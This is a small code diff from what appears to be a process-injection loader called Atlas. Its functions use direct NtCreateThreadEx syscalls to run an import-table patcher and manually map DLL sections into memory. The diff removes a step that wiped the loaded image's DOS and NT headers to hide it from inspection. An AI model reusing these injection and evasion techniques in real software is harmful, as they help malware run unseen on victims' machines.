@@ -81,7 +81,6 @@ VOID AtlasInject(ATLAS_PARAMS atlas_params){
     //End of params
 
     printf("%s - Executing %s to patch %s IAT\n", info, atlas_params.atlasPatcher, atlas_params.dll);
-
     HANDLE hExecution = NULL;
 
     fnNtCreateThreadEx sysInvokeExecute = (fnNtCreateThreadEx)C_SyscallPrepare(&atlas_utils, atlas_utils.atlas_syscalls.NtCreateThreadEx);
@@ -152,10 +151,6 @@ VOID AtlasLdr(DLL_DATA dll_data, ATLAS_UTILS* atlas_utils, ARTIFACT_DATA& artifa
         dll_data.baseAddr,
         dll_data.optHeader->SizeOfHeaders
     );
-
-    //Erase DOS Header + Nt Magic
-    SIZE_T sizeOfHeaders =  sizeof(IMAGE_DOS_HEADER) + (dll_data.dosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER)) + 4;
-    memset(pLocalMappingAddr, 0, sizeOfHeaders);
 
     for(SIZE_T i = 0; i < dll_data.fileHeader->NumberOfSections; i++, sectionHeader++){
         memcpy(
